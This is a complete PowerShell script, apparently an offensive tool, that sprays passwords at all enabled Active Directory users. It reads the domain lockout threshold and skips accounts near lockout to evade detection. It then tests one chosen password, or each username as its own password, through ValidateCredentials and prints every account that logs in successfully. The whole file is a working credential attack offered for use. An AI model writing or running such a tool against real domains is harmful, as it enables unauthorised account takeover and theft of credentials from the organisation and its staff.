<#
  .SYNOPSIS
  Password Spraying Attack

  .DESCRIPTION
  This script performs a password spraying attack against all AD users.

  .OUTPUTS
  Returns the list of succesfully sprayed users.

  .EXAMPLE
  PS> .\PasswordSprayer.ps1 -Password <password>
  PS> .\PasswordSprayer.ps1 -UsernameAsPassword

#>

[CmdletBinding(DefaultParameterSetName='password')]
Param(
    [Parameter(ParameterSetName='password',Mandatory, HelpMessage = "Password to be sprayed")]
    [string]$Password,
    [Parameter(ParameterSetName='usernameaspassword',Mandatory, HelpMessage = "Use account username as password")]
    [switch]$UsernameAsPassword
)

$LockoutTreshold = (Get-ADDefaultDomainPasswordPolicy).LockoutThreshold
Write-Host "[!] Lockout treshold for current domain is: $LockoutTreshold"
Write-Host "[!] Performing Password Spraying - Excluding potentially lockable, locked out, deleted and disabled users...`r`n"

Add-Type -AssemblyName System.DirectoryServices.AccountManagement

$Users = Get-ADUser -Filter * -Properties * | Where -Property LockedOut -NE $true | Where -Property isDeleted -NE $true | Where -Property Enabled -EQ $true
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

ForEach($user in $users){
    if($($LockoutTreshold - 1 - $user.BadLogonCount) -eq 1){
        Write-Host "[!] $($user.name) potentially lockable, skipping..." -ForegroundColor DarkGray
        continue
    }
 
    
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain')

    if($UsernameAsPassword){
        $TestPassword = $user.name
    }else{
        $TestPassword = $Password
    }

    $LogonResult = $DS.ValidateCredentials($user.name, $TestPassword)
    
    if($LogonResult){
        Write-Host "[>] $($user.name) : $TestPassword" -ForegroundColor Green
    }else{
        Write-Host "[x] $($user.name)(Attempts Remaining: $($LockoutTreshold - $user.BadLogonCount - 1))" -ForegroundColor Red
    }
}
